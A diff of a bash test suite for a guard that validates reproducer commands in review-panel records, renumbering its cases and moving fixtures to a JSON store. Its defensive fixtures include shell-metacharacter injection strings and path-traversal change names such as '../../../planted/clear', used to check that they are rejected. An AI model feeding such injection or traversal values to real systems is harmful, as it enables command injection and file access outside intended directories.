-#     NUL-byte defect. F32: bash silently drops the byte from any variable
-#     it is read into, so this must be constructed directly on disk (like
-#     case 14/16 above) rather than through make_worktree's own "$1"
-#     argument, which cannot carry a NUL through bash at all.
+# 16. A runnable reproducer ends in a trailing backslash (`scripts/x.sh\`) --
+#     exit 1, naming the shell-metacharacter defect: a trailing backslash is
+#     a shell line-continuation, which would put a following line outside
+#     every check here if it were not banned.
 # ===========================================================================
-wt31="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-WORKTREES+=("$wt31")
-mkdir -p "$wt31/$REVIEWS"
-printf 'findings-total: 1\nfinding-status: F1 open\n\nreproducers-total: 1\nfinding-reproducer: F1 scripts/y\0.sh\n' > "$wt31/$REVIEWS/2026-01-01-demo-panel.md"
-expect_exit_and_names 'case 31: a NUL byte in the record is rejected' 1 'NUL byte' "$GUARD" "$wt31" demo
+wt="$(make_worktree_json "$(findings_json F1 open 'scripts/x.sh\')")"
+expect_exit_and_names 'case 16: a trailing backslash is rejected' 1 'shell metacharacter' run_guard "$wt"
 
 # ===========================================================================
-# 32. A runnable reproducer line ends in a trailing backslash
-#     (`scripts/x.sh\`) — exit 1, naming the shell-metacharacter defect. F33:
-#     a trailing backslash is a shell line-continuation, which would put a
-#     following line outside every check here if it were not banned.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/x.sh\')"
-expect_exit_and_names 'case 32: a trailing backslash is rejected' 1 'shell metacharacter' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 33. A malformed `reproducers-total: 01` line sits BESIDE a well-formed
-#     `reproducers-total: 1` line — exit 1. F39: T_WELLFORMED alone was
-#     satisfied by the well-formed line (exactly 1), so the malformed
-#     duplicate passed unreported; this pins the gap between case 13 (two
-#     well-formed duplicates) and case 20 (one malformed, alone).
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 01
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit_and_names 'case 33: a malformed reproducers-total beside a well-formed one is rejected' 1 'not well-formed' "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 34. Every banned shell metacharacter, INDIVIDUALLY, triggers rejection — a
+# 17. Every banned shell metacharacter, INDIVIDUALLY, triggers rejection -- a
 #     loop rather than one near-identical case per character, so that adding
 #     or removing a character from the banned set only requires touching the
-#     shared list here and in the guard. F35: shrinking the guard's list to
-#     `|;&` left all 25 cases above still passing, because only `;` and `|`
-#     (both inside case 22's chain) were ever exercised alone; every other
-#     banned character had no case naming it individually. Case 35 below is
-#     the positive control this loop needs: without it, a guard broken to
-#     reject every reproducer regardless of content would make this loop
-#     pass just as vacuously as the shrunk list once did.
+#     shared list here and in the guard. Case 18 below is the positive
+#     control this loop needs: without it, a guard broken to reject every
+#     reproducer regardless of content would make this loop pass just as
+#     vacuously.
 # ===========================================================================
 banned_metachars='|;&$`<>(){}~*?[]#\'\''"'
 mc_i=0
 while [ "$mc_i" -lt "${#banned_metachars}" ]; do
   mc_c="${banned_metachars:$mc_i:1}"
-  wt="$(make_worktree "findings-total: 1
-finding-status: F1 open
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/x${mc_c}sh")"
-  expect_exit_and_names "case 34.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' "$GUARD" "$wt" demo
+  wt="$(make_worktree_json "$(findings_json F1 open "scripts/x${mc_c}sh")")"
+  expect_exit_and_names "case 17.$mc_i: banned metacharacter '$mc_c' alone is rejected" 1 'shell metacharacter' run_guard "$wt"
   mc_i=$((mc_i + 1))
 done
 
 # ===========================================================================
-# 35. Positive control for case 34's loop: an ordinary command carrying NONE
-#     of the banned metacharacters is accepted at exit 0. Without this, case
-#     34 alone could not tell "the guard checks for metacharacters" from
-#     "the guard rejects every reproducer regardless of content."
+# 18. Positive control for case 17's loop: an ordinary command carrying NONE
+#     of the banned metacharacters is accepted at exit 0.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-expect_exit "case 35: an ordinary command with no banned metacharacter is accepted" 0 "$GUARD" "$wt" demo
+wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
+expect_exit "case 18: an ordinary command with no banned metacharacter is accepted" 0 run_guard "$wt"
 
 # ===========================================================================
-# 36. check-panel-reproducers.sh and run-reproducer.sh agree on the
-#     banned-character set, per finding F48 — this exact literal drifted
+# 19. check-panel-reproducers.sh and run-reproducer.sh agree on the
+#     banned-character set, per finding F48 -- this exact literal drifted
 #     between the two scripts twice already (the backslash for F33, both
 #     quote characters for F45, each time landing in one file before the
 #     other). Asserted two ways: both scripts read the set from
 #     scripts/reproducer-metachars.sh rather than each carrying its own
 #     literal (so neither can drift on its own again), and that shared
 #     file's value is exactly the expected set (so the shared copy itself
-#     has not silently lost or gained a character).
+#     has not silently lost or gained a character). Untouched by the store
+#     rewrite: this checks the two scripts' own source, not a panel record.
 # ===========================================================================
 METACHARS_FILE="$SCRIPT_DIR/reproducer-metachars.sh"
 EXPECTED_METACHARS='|;&$`<>(){}~*?[]#\'\''"'
@@ -612,142 +379,73 @@ if [ -f "$METACHARS_FILE" ] \
   # shellcheck disable=SC1090
   ACTUAL_METACHARS="$(bash -c 'source "'"$METACHARS_FILE"'" && printf %s "$REPRODUCER_METACHARS"')"
   if [ "$ACTUAL_METACHARS" = "$EXPECTED_METACHARS" ]; then
-    printf 'ok: %s\n' 'case 36: check-panel-reproducers.sh and run-reproducer.sh agree on the banned-character set'
+    printf 'ok: %s\n' 'case 19: check-panel-reproducers.sh and run-reproducer.sh agree on the banned-character set'
   else
-    printf 'FAIL %s: scripts/reproducer-metachars.sh carries an unexpected set: %s\n' 'case 36' "$ACTUAL_METACHARS"
+    printf 'FAIL %s: scripts/reproducer-metachars.sh carries an unexpected set: %s\n' 'case 19' "$ACTUAL_METACHARS"
     FAILED=1
   fi
 else
-  printf 'FAIL %s: check-panel-reproducers.sh and run-reproducer.sh no longer both source the single shared metachar file\n' 'case 36'
+  printf 'FAIL %s: check-panel-reproducers.sh and run-reproducer.sh no longer both source the single shared metachar file\n' 'case 19'
   FAILED=1
 fi
 
-
 # ===========================================================================
-# 37. A missing scripts/reproducer-metachars.sh is reported as "cannot
-#     answer" (exit 2), not "violations found" (exit 1) — finding F56. The
-#     guard's own `source` of that file, with no readability check ahead of
-#     it, let `set -e` abort the script at exit 1 on a missing dependency:
-#     the same code this guard's own contract uses for a real violation, so
-#     a caller reading a non-zero exit as "the panel record has a problem"
-#     was told the wrong story. Exercised against a REAL copy of the guard,
-#     sitting in its own sandbox directory with a well-formed panel record
-#     but deliberately no reproducer-metachars.sh beside it, rather than
-#     editing the real scripts/ directory this suite runs from.
+# 20. A missing scripts/reproducer-metachars.sh is reported as "cannot
+#     answer" (exit 2), not "violations found" (exit 1) -- finding F56.
+#     Exercised against a REAL copy of the guard, sitting in its own sandbox
+#     directory with a well-formed stub myflow beside it but deliberately no
+#     reproducer-metachars.sh, rather than editing the real scripts/
+#     directory this suite runs from. This check runs before the guard ever
+#     calls myflow, so it is unaffected by the store rewrite.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
+wt="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
 MISSING_DEP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missing-dep.XXXXXX")"
 WORKTREES+=("$MISSING_DEP_DIR")
 cp "$GUARD" "$MISSING_DEP_DIR/check-panel-reproducers.sh"
-expect_exit_and_names 'case 37: a missing reproducer-metachars.sh is cannot-answer, not violations-found' 2 'cannot read' \
-  "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt" demo
+expect_exit_and_names 'case 20: a missing reproducer-metachars.sh is cannot-answer, not violations-found' 2 'cannot read' \
+  run_with_stub "$MISSING_DEP_DIR/check-panel-reproducers.sh" "$wt" demo
 
 # ===========================================================================
-# 38. A missing scripts/lib/panel-record.sh is likewise cannot-answer (exit
-#     2), not violations-found (exit 1) — the spec's "A missing library is a
-#     refusal" scenario (F4). Same shape as case 37, and deliberately kept
-#     separate from it rather than folded together: the two are different
-#     sourced dependencies, checked by two different `[ ! -r ... ]` guards in
-#     check-panel-reproducers.sh, and a regression in either one must fail on
-#     its own rather than needing the other's fixture to also be right.
-#     Exercised against a REAL copy of the guard, sitting in its own sandbox
-#     directory with a well-formed panel record and reproducer-metachars.sh
-#     present, but deliberately no lib/panel-record.sh beside it — never the
-#     real scripts/lib/panel-record.sh, which this case does not touch.
+# 21. THE CHANGE NAME IS PR-CONTROLLED -- it reaches this guard from a state
+#     file anyone able to open a pull request can edit -- and is matched
+#     against the entries of a directory even after the store rewrite (task
+#     6 keeps this containment `case` block; only panel_record_path itself
+#     is deleted). These are the same shapes test-check-unfinished-work.sh
+#     rejects, asserted here so that the two copies of the allowlist cannot
+#     drift apart in silence, and one case for the name being absent
+#     altogether.
 # ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-MISSING_LIB_DIR="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test-missing-lib.XXXXXX")"
-WORKTREES+=("$MISSING_LIB_DIR")
-cp "$GUARD" "$MISSING_LIB_DIR/check-panel-reproducers.sh"
-cp "$SCRIPT_DIR/reproducer-metachars.sh" "$MISSING_LIB_DIR/reproducer-metachars.sh"
-expect_exit_and_names 'case 38: a missing lib/panel-record.sh is cannot-answer, not violations-found' 2 'cannot read' \
-  "$MISSING_LIB_DIR/check-panel-reproducers.sh" "$wt" demo
-
-# ===========================================================================
-# 39. THE RECORD IS READ WHERE IT IS RENDERED, AND ONLY THERE.
-#
-#     Every case above already proves the rendered record is read — make_worktree
-#     writes it nowhere else. This group proves the other half: that the guard
-#     does not also read, or fall back to, the pass log at
-#     .superpowers/sdd/final-review-panel.md. Without it a guard that silently
-#     fell back would pass this whole suite while reading a file nothing writes,
-#     and every fix round would fail on a record that carries no marker block.
-#
-#     39a — a well-formed record at the OLD path only, and nothing at the new
-#     one, is no record at all: exit 2, not exit 0.
-# ===========================================================================
-wt39a="$(mktemp -d "${TMPDIR:-/tmp}/check-panel-reproducers-test.XXXXXX")"
-WORKTREES+=("$wt39a")
-mkdir -p "$wt39a/.superpowers/sdd" "$wt39a/$REVIEWS"
-printf '%s\n' 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh' > "$wt39a/$SDD_PANEL"
-expect_exit_and_names 'case 39a: a record at the old sdd path only exits 2' 2 'no readable panel record' "$GUARD" "$wt39a" demo
-
-# ===========================================================================
-# 39b. The other direction, which a fallback alone would not catch: a guard
-#      reading BOTH files would pass 39a and still let the pass log's contents
-#      raise violations. A record at the old path missing every reproducer,
-#      beside a complete rendered record, must count for nothing — exit 0.
-# ===========================================================================
-wt="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-printf '%s\n' 'findings-total: 3
-finding-status: F7 open
-finding-status: F8 open
-finding-status: F9 open
-
-reproducers-total: 0' > "$wt/$SDD_PANEL"
-expect_exit 'case 39b: the old sdd path raises no violation of its own' 0 "$GUARD" "$wt" demo
-
-# ===========================================================================
-# 39c. THE MATCH IS ANCHORED ON THE CHANGE NAME. `*-demo-panel.md` also matches
-#      `2026-01-01-other-demo-panel.md`, another change's record in the same
-#      shared directory; answering this change's question with that change's
-#      findings is the read-side half of the incident records.Destination's own
-#      Protection 1 comment records on the write side.
-# ===========================================================================
-wt39c="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
-mv "$wt39c/$REVIEWS/2026-01-01-demo-panel.md" "$wt39c/$REVIEWS/2026-01-01-other-demo-panel.md"
-expect_exit_and_names 'case 39c: another change'"'"'s dated record is not this change'"'"'s record' 2 'no readable panel record' "$GUARD" "$wt39c" demo
-
-# ===========================================================================
-# 39d. The change name is PR-controlled — it reaches this guard from a state
-#      file anyone able to open a pull request can edit — and it is matched
-#      against the entries of a directory. These are the same shapes
-#      test-check-unfinished-work.sh rejects, asserted here so that the two
-#      copies of the allowlist cannot drift apart in silence, and one case for
-#      the name being absent altogether.
-# ===========================================================================
-wt39d="$(make_worktree 'findings-total: 1
-finding-status: F1 fixed
-
-reproducers-total: 1
-finding-reproducer: F1 scripts/test-check-panel-reproducers.sh')"
+wt21="$(make_worktree_json "$(findings_json F1 fixed 'scripts/test-check-panel-reproducers.sh')")"
 for bad_name in "../../../planted/clear" "demo*" "demo/../demo" ".hidden" "demo?x"; do
-  expect_exit_and_names "case 39d: change name '$bad_name' is rejected" 2 'is not a plain change name' "$GUARD" "$wt39d" "$bad_name"
+  expect_exit_and_names "case 21: change name '$bad_name' is rejected" 2 'is not a plain change name' run_with_stub "$GUARD" "$wt21" "$bad_name"
 done
-expect_exit_and_names 'case 39d: a missing change name is rejected' 2 'usage:' "$GUARD" "$wt39d"
+expect_exit_and_names 'case 21: a missing change name is rejected' 2 'usage:' run_with_stub "$GUARD" "$wt21" ""
+
+# ===========================================================================
+# 22. THE STORE IS UNREACHABLE -- stub myflow exits non-zero for
+#     `record findings`, and the guard must exit 2 ("cannot determine
+#     anything"), never 1 (there is no record to have found a violation in)
+#     and never 0 (a read it could not perform must never be reported as a
+#     clean answer). NEW in this rewrite: the previous guard's closest
+#     analogue -- no panel record file at the expected path -- is retired
+#     (see the header comment's "missing-record-file case" note), since a
+#     change the store has genuinely never heard of now answers `[]` at exit
+#     0, not a failure; the ONLY "cannot answer at all" shape left is the
+#     store call itself failing, which is what this case exercises.
+#
+#     THIS CASE FAILS UNTIL TASK 6 LANDS, on purpose: today's guard still
+#     resolves a rendered Markdown file, finds none (this sandbox writes no
+#     docs/superpowers/reviews/*-panel.md), and reports "no readable panel
+#     record for ..." at exit 2 -- the right exit code by coincidence, but
+#     not the "cannot determine anything" wording this case asserts, so it
+#     correctly fails now and will only pass once task 6's guard actually
+#     calls myflow and surfaces its failure that way.
+# ===========================================================================
+wt="$(make_worktree_store_unreachable)"
+expect_exit_and_names 'case 22: an unreachable store is cannot-answer, never violations-found or clean' 2 'cannot determine anything' run_guard "$wt"
 
 if [ "$FAILED" -ne 0 ]; then
   printf 'check-panel-reproducers-test: one or more cases failed\n' >&2
   exit 1
 fi
-printf 'check-panel-reproducers-test: all 39 cases plus the metacharacter loop pass\n'
+printf 'check-panel-reproducers-test: all 22 cases plus the metacharacter loop pass\n'
